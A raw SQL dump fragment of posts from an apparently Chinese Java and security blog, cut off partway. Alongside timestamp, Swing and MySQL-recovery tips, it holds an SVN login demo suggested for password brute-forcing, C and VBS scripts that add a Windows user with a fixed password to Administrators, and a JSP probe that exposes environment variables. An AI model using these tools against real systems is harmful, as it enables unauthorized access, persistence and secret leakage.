'Java 实现登录SVN(可3690端口爆破)', '园长', '很多扫描SVN工具都是扫描的.svn文件，不能通过端口去扫描SVN。Java有SVN的扩展库，已实现了SVN客户端的所有功能。\n<p>SVN有个未授权访问问题，默认不开启。一般人都会设置必须登录才能访问资源，但不排除少部分偷懒的人。其次就是SVN弱口令了。</p>\n<p><span style=\"color: #454545; font-family: tahoma, helvetica, arial; font-size: 14px; line-height: 24px; background-color: #ffffff;\">svnserve.conf：</span></p>\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">authz-db = authz</pre>\n去年写了个简单的SVN客户端放着也没用。下面给的一个认证的demo程序，需要jar包自己去找。引入jar就可以登录SVN了，稍微改改或许可以做个暴力破解了。（String user,String pass参数是帐号密码，如果考虑authz-db = authz可以在调用createDefaultAuthenticationManager的时候不传值）\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">import org.tmatesoft.svn.core.SVNException;\nimport org.tmatesoft.svn.core.SVNURL;\nimport org.tmatesoft.svn.core.auth.ISVNAuthenticationManager;\nimport org.tmatesoft.svn.core.io.SVNRepository;\nimport org.tmatesoft.svn.core.io.SVNRepositoryFactory;\nimport org.tmatesoft.svn.core.wc.SVNWCUtil;\npublic class TestLogin {\n	@SuppressWarnings(\"deprecation\")\n	public boolean login(String url,String user,String pass){\n		SVNRepository repository = null;\n		try {\n			repository = SVNRepositoryFactory.create(SVNURL.parseURIDecoded(url));\n			ISVNAuthenticationManager authManager = SVNWCUtil.createDefaultAuthenticationManager(user,pass);\n			repository.setAuthenticationManager(authManager);\n			repository.testConnection();\n			return true;\n		} catch (SVNException e) {\n			System.out.println(e.toString());\n		}\n		return false;\n	}\n	public static void main(String[] args) {\n		TestLogin l = new TestLogin();\n		System.out.println(l.login(\"svn://xxx.net\", \"xxxxxx\", \"xxxxx\"));\n	}\n}</pre>', null, '2013-11-30 14:18:49', '1', '570', null, '0', '2013-11-30 14:19:31'), ('140', '1', '3', 'Java UNIX时间戳转换', '园长', '转换：\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">public static void main(String[] args) {\n        try {\n            long epoch = new java.text.SimpleDateFormat (\"dd/MM/yyyy HH:mm:ss\").parse(\"09/22/2008 16:33:00\").getTime();\n            System.out.println(epoch);\n            long epoch2 = System.currentTimeMillis()/1000;\n            System.out.println(epoch2);\n            System.out.println(\"\"+new java.text.SimpleDateFormat(\"yyyy MM-dd HH:mm:ss\").format(new java.util.Date (1364831279L*1000)));\n        } catch (ParseException e) {\n            e.printStackTrace();\n        }\n    }</pre>\n<p>简单取当前：</p>\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">Math.round(new Date().getTime()/1000)</pre>\nMysql:\n<pre class=\"brush:sql;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">SELECT UNIX_TIMESTAMP() ; \nSELECT FROM_UNIXTIME( 1249488000, \'%Y%m%d\' )</pre>\n<p><span style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\">1、获取当前系统的UNIX时间戳</span></p>\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">System.out.println(\"获取系统毫秒数方法1：\"+Long.toString(new Date().getTime()));\nSystem.out.println(\"获取系统毫秒数方法2：\"+Long.toString(System.currentTimeMillis()));</pre>\n<p><span style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\">    注意：以上代码获取的都是系统毫秒数，在实际的操作中我们一般都是记录毫秒说以求记录的精度，当处理UNIX时间戳的时候需要把数据进行处理。</span><br style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\" /></p>\n<p><br style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\" /></p>\n<p><span style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\">    2、将UNIX时间戳转换成系统可以处理的时间</span></p>\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">System.out.println(\"\"+new java.text.SimpleDateFormat(\"yyyy MM-dd HH:mm:ss\").format(new java.util.Date (1215782027390L)));</pre>\n<span style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\">        输出：2008 07-11 21:13:47</span><br style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\" />\n<span style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\">    注意：此时处理的数据为系统毫秒不是UNIX时间戳</span><br style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\" />\n<span style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\">    </span><br style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\" />\n<span style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\">    3、讲时间转换成UNIX时间戳</span><br style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\" />\n<span style=\"font-family: Arial; font-size: 14px; line-height: 26px; background-color: #ffffff;\">        </span>\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">long epoch = new java.text.SimpleDateFormat (\"dd/MM/yyyy HH:mm:ss\").parse(\"09/22/2008 16:33:00\").getTime();</pre>', null, '2013-11-30 19:51:58', '1', '535', null, '0', '2013-11-30 19:52:47'), ('143', '1', '27', 'JavaSwing 窗体居中', '园长', '<p>\n<p>	&nbsp;</p></p>\n<pre class=\"brush:java;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">\nint screenWidth = Toolkit.getDefaultToolkit().getScreenSize().width;\nint screenHeight = Toolkit.getDefaultToolkit().getScreenSize().height;\nthis.setBounds(screenWidth / 2 - 400, screenHeight / 2 - 325, 800, 650);\n</pre>', null, '2013-11-30 19:54:47', '1', '518', null, '0', '2014-08-14 11:09:05'), ('145', '1', '12', 'net user', '园长', '<pre class=\"brush:cpp;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">#include &lt;windows.h&gt;\n#include &lt;lm.h&gt;\n#pragma comment(lib,&quot;netapi32&quot;) \n int main()\n { \n  USER_INFO_1 u;\n  DWORD dwError=0;\n  u.usri1_name=L&quot;tomcat&quot;;\n  u.usri1_password=L&quot;admin888&quot;;\n  u.usri1_priv=USER_PRIV_USER;\n  u.usri1_home_dir = NULL; \n  u.usri1_comment = NULL;\n  u.usri1_flags=UF_DONT_EXPIRE_PASSWD;\n  u.usri1_script_path = NULL;\n  NetUserAdd(NULL, 1, (LPBYTE)&amp;u, &amp;dwError);\n }</pre>\n<p>360.vbs</p>\n<pre class=\"brush:vb;first-line:1;pad-line-numbers:true;highlight:null;collapse:false;\">set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)   \nos=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName   \nSet ob=GetObject(os)\nSet oe=GetObject(os&amp;&quot;/Administrators,group&quot;)\nSet od=ob.Create(&quot;user&quot;,&quot;test&quot;)\nod.SetPassword &quot;1234&quot;\nod.SetInfo\nSet of=GetObject(os&amp;&quot;/test&quot;,user)\noe.add os&amp;&quot;/test&quot;</pre>\n<p>下载地址：<a href=\"http://pan.baidu.com/s/1ePe7n\">360.vbs</a></p>', null, '2013-11-30 19:56:08', '1', '542', null, '0', '2014-02-18 13:35:58'), ('177', '1', '3', 'JspInfo Java环境探针仿phpinfo()', '园长', '<pre class=\"brush: java; gutter: true\">&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot;%&gt;\n&lt;%@ page import=&quot;java.util.*&quot; %&gt;\n&lt;%@ page import=&quot;java.util.regex.*&quot; %&gt;\n&lt;%@ page import=&quot;java.lang.reflect.*&quot; %&gt;\n&lt;%!\n	String getRequestFileRealPath(HttpServletRequest request){\n		String webRoot = request.getSession().getServletContext().getRealPath(&quot;/&quot;).replaceAll(&quot;\\\\\\\\&quot;, &quot;/&quot;),\n			   context = request.getContextPath(), \n			   uri = request.getRequestURI();\n		if(context!=null&amp;&amp;webRoot.endsWith(context+&quot;/&quot;)){\n			return webRoot.substring(0,webRoot.indexOf(context))+uri;\n		}\n		return webRoot+uri;\n	}\n%&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;\n&lt;title&gt;IsWaf Info&lt;/title&gt;\n&lt;style&gt;\n	body {background-color: #ffffff;color: #000000;}\n	body,td,th,h1,h2 {font-family: sans-serif;}\n	pre{margin: 0px;font-family: monospace;}\n	a:link {color: #000099;text-decoration: none;background-color: #ffffff;}\n	a:hover {text-decoration: underline;}\n	table {border-collapse: collapse;margin-bottom: 15px;width:800px;}\n	.center {text-align: center;}\n	.center table {margin-left: auto;margin-right: auto;text-align: left;}\n	.center th {text-align: center !important;}\n	td,th {border: 1px solid #000000;font-size: 75%;vertical-align: baseline;}\n	h1 {font-size: 150%;}\n	h2 {font-size: 125%;}\n	.p {text-align: left;}\n	.e {background-color: #ccccff;font-weight: bold;color: #000000;}\n	.h {background-color: #9999cc;font-weight: bold;color: #000000;}\n	.v {background-color: #cccccc;color: #000000;}\n	.vr {background-color: #cccccc;text-align: right;color: #000000;}\n	img {float: right;border: 0px;}\n	hr {width: 600px;background-color: #cccccc;border: 0px;height: 1px;color: #000000;}\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n	&lt;div class=&quot;center&quot;&gt;\n		&lt;table border=&quot;0&quot; cellpadding=&quot;3&quot;&gt;\n			&lt;tbody&gt;\n				&lt;tr class=&quot;h&quot;&gt;\n					&lt;td&gt;\n						&lt;a href=&quot;http://javaweb.org/&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHkAAABDCAYAAAC4G6qCAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAIGNIUk0AAHolAACAgwAA+f8AAIDpAAB1MAAA6mAAADqYAAAXb5JfxUYAABWrSURBVHja7Jx7lN1Vlec/+5zf73dv3apblQqpPAivBMIrQJBHeC15jo2I2uC4kPHVCNo4PhaOojjTPa5Wx9Ylds8otraA3U1LO2uY1TIqoiMgAXsYUHSQKBEIr4SQEEJSValb997f75y954/frUoqqahpSEEltdc6Veu+zj33fM/e57sf54iZMSN7tyRT8SVDxx63x/o2kaofHlrk2u1VUzlxoVql3duHjCuJbfe3FEEAUIx2UVBNEpz3JD6hKALiHc4MabcJWYZhODPMYGDlw9ML5FxkT3bfDv39l1ZjvBazkakCWZ1DsBlNHl/RGvdk94bZwaExcqKEcA/IHv41JbDa0wNptoPu7sMg+9HmntWqarXe7u451jTuWZBlmxl23oHNaPK4FN21PWspxO3vRPpwflJQXp6VZDiNSJpgImiMTBeZEpDDbi94KxGSHRGzyZSr6uHIpNm82RVh4otOXjaktZLhTNE0YbrJlIx44LBDd1c1sRgZenYdYHjv0TzHnAfnJjJY1VOJOivr7V3lZdtCMOdIV68mGRx86buw92xZsgRMmI4yJSCnlcpug0wIiCpgOBHIC1yaUh8eBlXMDBEY6a5f1vY+b4bwEGMgG5Ak9JaL4KWD7BzmHGicAXnXs2T/io/YTsAHM0YQerKMpFKhaOeLCrO3ebgtETaDlXpsRigKZsI8Uwnyy+kU17ohS3GVjCLNv6ohVNPBLddJq1WuhWoXsb9/Wrg2MyDvQpwZsShoF8WnBN6A2Z2tWm2F1Wok3uOrXUhR7Hl3eTrN2XQctMGVAp8WEfK8/el2UWACaZptF2Z8GV000xmQp1JE5AqFvzVVfLXy1wuWLv2XOQsXUk0rO5roo4CXxUEvat3g3AzIexxcQEX+vQo3dnjYXZIkn7TRUVrPb8ScjDG2t0X4uoqbJ2b5S7IYIjTmL2Bw0WJM3LTd55Npor6ok6sFru08Xim4S0OzVYwMby3Zu9m50fgSxM0m8n4TWb07X5HX6zTnzi1dJTMQQVTJaz3/ag9hBuTdEFX7T+r85zoPV7ksvVDzfFOMAYf1kyTXmnGFD8VXnLiP5Gn6ByOiSUJj//1p9/dj22fLRHDtNqKxDMJMYyKXvMoVGI36rqj2OQBx7hEV9/qkMbrW2m1ivb4oCreSyDIf44d9iF+19A/fgcw5hg8+mLy3FxcCsgPIYjZdg1zTZE8uJ3w5xg0AxLg+SZMLEw1rex97FJ/ni5zwE2CZc/KnTuSru2tQG/PnjwM84ye/5KXkdhtgzfO6qd0EVBCJtYE579CRkad7nniCUKvV897e74jaIRhfFpEb2M3ChHZfH82BASRG9naZmsqQjRt3G+TWSOMTqnqkOEcy2vhSNRR3y5YtuCRhaGDu52KWHe/y/Jm+J5/8lPV005w3/w8yrU/UFzI4q49FfftOtGRqarx2F2ToQ9yVIgLGJvXVzw81W9SKgNW6D8u7uq4UVQy+PDxv7jAimCnJ79DmlQOLuXb527nlgAtZZqv4yX3XMrqPFDFOCcjm/e693zjWwUDn4QqydMiyhK29PQAXo5phRnByt9V7xz+Ui5E6KVOVzuE1Epzjs6f/CV865e2MVnthS0K11Z7WLtGrEuTdZndC3xgG4uQeE1A1UEPgxLG1UNs6El0oJu/De4J4LvnjP+P7x7wJ2k1ojYD1sq/JFLlQu73/PT8WXXIia8U5xBQtn+ru7NuiaXqSObdysg4yDfxy8XF8/4gzobWVvcIXejWD3GU7uygRIcgudXxVhOeA/UOMVdOINxAMQzaOmeei1v2nZnaTwU4ZhDS0+eX8ReA8BGVfTktNiZ/8SLrfxJYNsDGp0V00SWJBNNuxNYBbOjbgWOkUe5gICPeN2wfTU1MNr68VbWpFi/J/2dK8yXNdPczIFGnyqYd+cKe1NXe2561DP+OyZx5g6db15C6hnWTjKQAxu87UPuTz/Jx0ZARLEkJvHTP7kcEoYxkm56+p1us/FO9tezKVhjbPz5q7TxGsV1STFbdDgw2VPr562PmcccbHuWbJxTybpww88wRznnmavrVr6X127ZOV4eEvxSw7vdHbe/BIVxcxCBKTdWLuH7eZfc4cCfGikTxnpCi2tag8VuuDaZ4LnjYgd4ztxGYRQou2OL5yxBtYft5fcvVJV/HCcSdSOewQKkcfTc+hiz8jIqszkb/o9UI1AaoOKv4z5tym8d7brcuSdpuxVmk2GVHHo7XZMyDzaohdm0IxSqPSw18dfjHHnf4Jru9dhj76BP6hh5o9G9a/S5PksiD+WPI2yZbNJJtfXJ+NjHx0LGukyCFthLGWxILvL1jCCz39oDMgv3oSFBahaLBRE6484b2cf+blNDZvoqvRuN+8+zTN5t9UXnyRSmMEp4Zo/JbT+HAnW7RFQoGEgjRv0TLh+sNO2eV+LGa4bRreA5zVaQMTjM8MyHsS7DZ3HnsSl7/lIkzAR/2L0NX19Av7zXnbht5+NA9kIyMkzda9JgLBfuBakVqjhbaN9x77bh4cWAJxksIQDTzSewBrq/0kGsBsiSErDFlhynmmYxb+5Tt9MQPyrmS0wS0nnsifn3sevXkLZ/r+mksO6fG1ntC3H6OzZxO6qhWnutmncmNPRXl2znwuOutj/M/DzoHQBhlXRw+UFf6qvFAb4LvzT6BWLgKbwBHHnnGU2TObAfnlltnAOcAFwCyKgi+ceDw/nruQ/dqjo96Kr3XtP9t3DfThYnRmnFEz/XB/u7Hl9vmv4d+cdg33zlkK+SgUDqKrQfJekK+D/Rrhu2TxAjRy0wFn0EiqOHYu4nca9qoU5KsAZElBLifRO6gV3yDK4TjWITqCKZofyjtO+BifPeJN5C7Z2p3aULZ2DRTh9XWvNzbS6rc/cNyfcNHJH2JN134QmpBEeHohfPckcHIXzq5G2u8juhOo5bcTi8t/03cw9886lErcIfZtRuVlOD+1zwVDdhmQMPceSD6Muf0Z5VN0600obURBe2D0NRDnMOThU0sv4ZYDT+GK5+7jSlnta8JT93Yfcvsnj38Hv+xdVII7tmajSzlgJCUMjhLcU/gIkRWMphfSG38G+l9J/O2/qS/YcN6mR2iOD0fIRhpUhodoDQyA6OHAKQLzgWDiVgJ3jmk8xglgs4GtTuQBADUbsw1zgeMAnLgHgK2dr5mnqmcCB2GGmT0mIj8EArC4s7VsBl6cXiDX0h21t4aX76PJueWmp18m5XoogLTj9nTcH4nlW0Lg1/WF/IcjL+F7fUdGh666q//ohEqlTjE6B+EghNNx7hjgEdT9LQdtHUVcSeYSDz36MOZWgJ2P6euequ33rYl3fDhcu0VerS4xuM6cO79coGVcNSQJovYD592/S1S3atT3a5K8T1RHq8PDBzrVza3uHkK1AmpvxexvyqCcPzBJs1Swr5vaBZFYL73HckGo9w9ktdpbYrvdq3n+RyLyOHDr9AJ5Xt9ONhojH9dwx1V4uwRNHgR+AwxisQUWOsVeGVAlFj0I/XcvOG4xcDChmEVs9+MkAzbhiscpKv+LtlxHTZsEKX+hePBJacYDz5T0Sha2fLYD8460Zu8HIvPF9HyBVZg9aiK5wFKDpWZ2oar+eaXVvkbMbm8myftMpDbS23eiObnDq+FDQEUOtpKdP4Xquizx+1uIlwDrgX8BhjuaezIip4Q8v86Ef+uLsDIkbjqa652eaQAXILIc9HSwYzF/FGZnILwB8OMLYKKpL1BpEsKTiD2Ct2fAHsfkt0T3C3xzCKtsl1aUkjD7fNsZdksXdTpeUwvtSXxoEPiVhuLc1Ll7Y4yRtILDuiL8CDjTVC9uV6v/UdTuR3UUkVqSZWfTVb3DbxnEDQ9RdPccrmmKd+6xJE0thOJ5b7xOvXtAzbZi5fEbUf2WJsk7Nc9flzZH5yCyCalMQ5B3LT9D7GdYBEkghgSf9CB0o6RgrnRXJWJWIDRpVJpIbCEG3cUkC0i2ey6AD7CxD0YzqOUHsl/jDEwamN29aHTTJJ6wYc6GzexuA8z5zvYrTTP7tsCZQL+p1bU1uoGu2q8FlmuRn41GHIarVMEnhwigqg8V7RYuSYLD7lQRJATMO0Q94tK/x8I7EekpuroHEDbZy+yfv0rqrjtqlvgq5o0o6yBu7+dOtAplcrkDpoBoSVckgaQNLgGnoJ1FkAVIARc/g0kN1f9MaK1f3NhIkJ1LkyQaSYyogVYqZddlZO2F8VE4cd5nEOK9mibLxTiuNtKYJ3nxfIBuqzK/U0H6c0PQzoH6GCO+CJjPMAmYuBfHjYjsmXDbKw+y+Q6h5GKMD+LCG8lTKBKo52V4wqw0wWZQy0sARUAduDHADdRDkpckW7Rk2ybQ2wS4HHOXYXIr4r6wsLGBk4bW0HbJxLWmUB3cQqhkROfnAm8ys6UGfcDhE8ZetLHEryBLrzaznkaankyS3ibOLzQnA5gV6Wjj/4kq7e5utAS9Yt5fCJxqIrOBhXs6kJpMqabuaIa2/awlYN8BCow3g92PyCAwwo5VH04pKTizgDnAYkzOAlkGfB5kxU5fpe5y4JuYux6LH8JVwtvXP8i8fJihpGvbcMSRjW6lMjRI+6CD3mEu+W9iNsd24QZarYZofNBUtyJSl67qORLjbTbSOJ5azTvVx9IiPBO8R53DmZ0twtct8UeOW6G9xk92to3VTL5et6K2BuQgjP9BFnJSNqMMd9joJsQKoErps87FbBbC7AmTpe4cxF+GyLe3hTPl0xTJu3H52/DcAo5K0eCS539Jy6U7DzUG8p6e18Y0u1lUEbjR4HsOWy3ImyN8YcxPthixGJ7HJ78GTrMivFa8w7prp6GGOLlP6z0xyTIqsDiE+D2MukPuUOEGZ7bKYcsCcvOeRHxqQH6uCVkf9Eao6GRpoQ2EcCqh62oqxRsxWYIwvwPo4b+Ht68DHseFexip3UHFr6a7CcQ+fPVy0M3kHIdLBqkpSMZZm1dydGM9DT+RxYqqtWb1gbiPiypO5CvAVWaGimCwbJwmmCHe40wxjT9Vn5yG2ZFJCHMCLFeE4Pxd0SfUkhQXwweBuoTwoMMu0Kwa1SKYdO1phZ4akIvOHloA6XZ3dE0wqbKe6D6G6SdRfyjOTgY5oBPP7kYQjAJhK8aLIM/h2r9CszWYNJACtMOsk99A7M7xR90A+chE82G8Z919u140pWuzDCCa3l5GrATdxZujKjh3DyKfwKweYrxAnT9GnLSSruq9rtkkbNhA0dOznCTBdXffk9ZqMQ4NjcVYZO8w1zJJ5k47qR6xDlEaZ8oF1eZvsepvyZPtPivb7YvGzpe3bX+5WxvIdr7r0Scctelpztu4iqbLJgfZOTDNKIc1b6xTrwbYEnV+fBwiDi8Ogj4YfLkv4/xVOOlV1RXF0PA68R7pn4UYmZjh1eZJu42Zlr/bZMmeTnW9sgkK69Cq6MFnUAmAP5kmixlud9huZyGMTYRtN2zLtiNjCdSKkpLZJBebClBUePP6XzGraKK4sRJQv/1sJKMNKMI6RDDk44YsB441kb9S5DPbEzADcoxcbCMivyoNkpwoCJj9s40lp9UQ7BlEKELxx83m6EUYR2N8Euwf9zS7fnWkGvMCWgVYfDeW3Ievvp2uWu8OVnaSuZB+4ELKAMU2v7p9BFhXJ+Ys4GNZf13A/50zn7yVkzRGSEYb+FZzG/uKllt3naSn58YOmMeAPWDGwwYfReQHQAuoA4IIWYxUiwLfbv107GSlmZE5+XFPkuCzDO2qEtP0xs5rdTNu7YRvPy/e34vIc51l6Kavuf59Enyp0sJFiCZY8lng/QhrwTZisomyDNdAamADwAKMg0umLYYmfw/2RUQfRXuh6IBMgK5OkmPUcd+CJfziwCWcsHk9bZ9gjDF0iDFuzmb10jsw8I3BJ5+cFYwPUPrHz3n4soq73kxvAWZ1GAbqE0wi5txtmJ1tQCLyVCXNngAjJAlN7/He/9jn4T0I1wD7A5tdCN+ULPuiwRc1huUgjb0TZAGKGrQ3wahdw+zehfiwHGMhsPB3uF0Te1Fej/AL4DFQw8b281ASsg4jDmnGyv4FnPris7TMY8hpnT5aSZY8FZtNYp5b4twXNOp1WrptQw5C8A6L+lZnnasgAV8pr5Uys/va2OkGOFW6WqHcu7OMkVqts4/LPwj2Twa9wIhTbWuRY/CRcueY1sGQSaUbOAlsHk5/Tk/1Kba2H6ednkFPuJRgFyJydseNmkzawJMYK/B2B4XcjrNtGQfbxdEYU5wTvDhUbX+8e18JkvwfVJ4LMVI0W2M3HTQ67Xfnyn9HAf8krxQTcsUTCOXeAHL5W5ZivBc4AdHHUf0R3c0C8RAqoBaAm1G7GS+zEA4CW4jJgk6k60WwZ4m2kdSvIWqYfNK3Y9siEAWcLUHTF6Rg0MzmOu/+wczmAdSc/4xXj5nh8rhXXdo4NSAr4KyL1P4L8AHQfybou0jcmrHrlAgOuqw0r9tmeLDTHv69KqK+rK1IcvB+ohaPuWBJ/AgrD79t8wtH/zCp3r9UC17XccQ+WEm5NxUFM6I32nsRyFPDruvuFPra3yHVj2JSxYVvoqxhawUqOZiDloeKQdYhSb6TXBjfrGSbViKQCIwmZSIDKd8TJzvsLh6TExC7EaTO8Wvu/cbZy/jrOefeXR8Z/ksn8kY1+5ptf8BjL5Op0eTZtdPA/qhzTzFYeieeO0j1VnAPA48ibN71BMvOuQ5HaYIn7rtV4ICy2eEYr8GqrwU24vjvtNIbSHLW0M3Hlr3zwKWNdX921pbVDE4Sw54BebcZtH0D5CHM3gOci7EAz/kk4XxCBVwcpaa/xdgAbAK2AMMIo0Be+kGlfmNkQAWjh0qoI/RjzCGNc0niQpzfD4hgT+H0f0O8Cs3uQoH6MFg6D+xz+NqNKwaOXnve5kc7W/0MyC9VmggrwFYgrht0ARIOQtNDQJYjdgRiC4FDyjJNySZuvDaRWNGJhKXaBAYxNiA8idhNiKxEeByzp8kdVGIncmZH4JIrUHcp6r4G3P9CUmdfkFfChWoAqxFdjRqI/h1eOr6sgBQ94Lsx34VYBZNqqb0G3rUwa4O2Gak06c5H8Do67mCOO5oGar000xNI7UzgLQjHYP5B2tkVRO6gbvh95MTjK+Mnj1VyhDaIr+PSCzDrRngCTZ9HGATbiBRNLLPxcOWYe+QcdBcJYj2YzAGZg+lSxC0BlmAsQeRQ6mEWJmsQ+w6t9CN4XYEI+9qt9q9wxMsA2YrKT3DhKCw7HNFLQWaD1tEkxXAIZY2QWQokqGU4SzE8RgJWVtsRtyCyAXM/An4OugrkCYSIyjS9wn1viV3DJrCfAqsweRQ4ABfnQjKb4OoksZvywFqG4DtuVQRrgYyADWKyEafrEfcc8ATGC8xIh/fO3Kmx14ubmYIZkGdkBuQZmQ7y/wcAAt9ah72hq6UAAAAASUVORK5CYII=&quot; alt=&quot;Java Logo&quot;&gt;\n						&lt;/a&gt;\n						&lt;h1 class=&quot;p&quot;&gt;&lt;%=System.getProperty(&quot;java.runtime.name&quot;)+&quot;:&quot;+System.getProperty(&quot;java.runtime.version&quot;)%&gt;&lt;/h1&gt;\n					&lt;/td&gt;\n				&lt;/tr&gt;\n			&lt;/tbody&gt;\n		&lt;/table&gt;\n		&lt;br/&gt;\n		&lt;h2&gt;System Environment Variables&lt;/h2&gt;\n		&lt;table border=&quot;0&quot;&gt;\n				&lt;%\n					Map&lt;String,String&gt; map = System.getenv();\n					for(String s:map.keySet()){\n				%&gt;\n				&lt;tr&gt;\n					&lt;td class=&quot;e&quot;&gt;&lt;%=s%&gt;&lt;/td&gt;\n					&lt;td class=&quot;v&quot;&gt;&lt;%=map.get(s)%&gt;&lt;/td&gt;\n				&lt;/tr&gt;\n				&lt;%\n					}\n				%&gt;\n		&lt;/table&gt;\n		&lt;h2&gt;&lt;%=application.getServerInfo() %&gt; Environment&lt;/h2&gt;\n		&lt;table&gt;\n				&lt;tr&gt;\n					&lt;td class=&quot;e&quot;&gt;SERVER_NAME&lt;/td&gt;\n					&lt;td class=&quot;v&quot;&gt;&lt;%=request.getServerName() %&gt;&lt;/td&gt;\n				&lt;/tr&gt;\n				&lt;tr&gt;\n					&lt;td class=&quot;e&quot;&gt;SERVER_ADDR&lt;/td&gt;\n					&lt;td class=&quot;v&quot;&gt;&lt;%=request.getLocalAddr() %&gt;&lt;/td&gt;\n				&lt;/tr&gt;\n				&lt;tr&gt;\n					&lt;td class=&quot;e&quot;&gt;SERVER_PORT&lt;/td&gt;\n					&lt;td class=&quot;v&quot;&gt;&lt;%=request.getLocalPort() %&gt;&lt;/td&gt;\n				&lt;/tr&gt;\n				&lt;tr&gt;\n					&lt;td class=&quot;e&quot;&gt;DOCUMENT_ROOT&lt;/td&gt;\n					&lt;td class=&quot;v&quot;&gt;&lt;%=application.getRealPath(&quot;/&quot;).replaceAll(&quot;\\\\\\\\&quot;,&quot;/&quot;) %&gt;&lt;/td&gt;\n				&lt;/tr&gt;\n				&lt;tr&gt;\n					&lt;td class=&quot;e&quot;&gt;SCRIPT_FILENAME&lt;/td&gt;\n					&lt;td class=&quot;v&quot;&gt;&lt;%=getRequestFileRealPath(request)%&gt;&lt;/td&gt;\n				&lt;/tr&gt;\n				&lt;%\n					Enumeration&lt;String&gt; e = request.getHeaderNames();\n					while(e.hasMoreElements()){\n						String k = (String)e.nextElement();\n				%&gt;\n				&lt;tr&gt;\n					&lt;td class=&quot;e&quot;&gt;&lt;%=k%&gt;&lt;/td&gt;\n					&lt;td class=&quot;v&quot;&gt;&lt;%=request.getHeader(k) %&gt;&lt;/td&gt;\n				&lt;/tr&gt;\n				&lt;%}%&gt;\n		&lt;/table&gt;\n		&lt;h2&gt;System Properties&lt;/h2&gt;\n		&lt;table border=&quot;0&quot;&gt;\n				&lt;%\n					for(Object s:System.getProperties().keySet()){\n				%&gt;\n				&lt;tr&gt;\n					&lt;td class=&quot;e&quot;&gt;&lt;%=s%&gt;&lt;/td&gt;\n					&lt;td class=&quot;v&quot;&gt;&lt;%=System.getProperty((String)s)%&gt;&lt;/td&gt;\n				&lt;/tr&gt;\n				&lt;%}%&gt;\n		&lt;/table&gt;\n		&lt;br/&gt;\n		&lt;h2&gt;Java License&lt;/h2&gt;\n		&lt;table border=&quot;0&quot; cellpadding=&quot;3&quot;&gt;\n			&lt;tbody&gt;\n				&lt;tr class=&quot;v&quot;&gt;\n					&lt;td&gt;\n						&lt;p&gt;javaweb.org&amp;p2j.cn&lt;/p&gt;\n					&lt;/td&gt;\n				&lt;/tr&gt;\n			&lt;/tbody&gt;\n		&lt;/table&gt;\n		&lt;br/&gt;\n	&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;</pre>', null, '2013-12-04 00:04:30', '1', '638', null, '0', '2013-12-04 00:06:09'), ('197', '2', '17', 'MySQL异常关闭后无法启动：MySQL Daemon failed to start 解决方案(CentOS下)', 'blue', '今天MySQL数据库占内存过大，导致网站时常出现500错误，按以下步骤解决：\n<p>1. 尝试/etc/init.d/mysqld stop 无响应，只得ps -ef | grep mysql 然后kill掉两个相关的mysql进程</p>\n<p>2. 尝试/etc/init.d/mysqld start 不成功，查看mysql日志 cat /var/log/mysqld.log，发现以下错误：</p>\n<pre>Thread pointer: 0x0\nAttempting backtrace. You can use the following information to find out\nwhere mysqld died. If you see no messages after this, something went\nterribly wrong...\nstack_bottom = 0 thread_stack 0x40000\n/usr/libexec/mysqld(my_print_stacktrace+0x29) [0x84f539]\n/usr/libexec/mysqld(handle_fatal_signal+0x483) [0x6a3713]\n/lib64/libpthread.so.0(+0xf500) [0x7f85469cb500]\nThe manual page at http://dev.mysql.com/doc/mysql/en/crashing.html contains\ninformation that should help you find out what is causing the crash.\n131103 11:25:24 mysqld_safe mysqld from pid file /var/run/mysqld/mysqld.pid ended\n131103 11:26:49 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql\n131103 11:26:49  InnoDB: Initializing buffer pool, size = 8.0M\n131103 11:26:49  InnoDB: Completed initialization of buffer pool\nInnoDB: The log sequence number in ibdata files does not match\nInnoDB: the log sequence number in the ib_logfiles!\n131103 11:26:49  InnoDB: Database was not shut down normally!\nInnoDB: Starting crash recovery.\nInnoDB: Reading tablespace information from the .ibd files...\nInnoDB: Restoring possible half-written data pages from the doublewrite\nInnoDB: buffer...\nInnoDB: Last MySQL binlog file position 0 787278622, file name /var/lib/mysql/log/mysql-bin.000014\n131103 11:26:49  InnoDB: Started; log sequence number 0 1736090200\n03:26:49 UTC - mysqld got signal 11 ;\nThis could be because you hit a bug. It is also possible that this 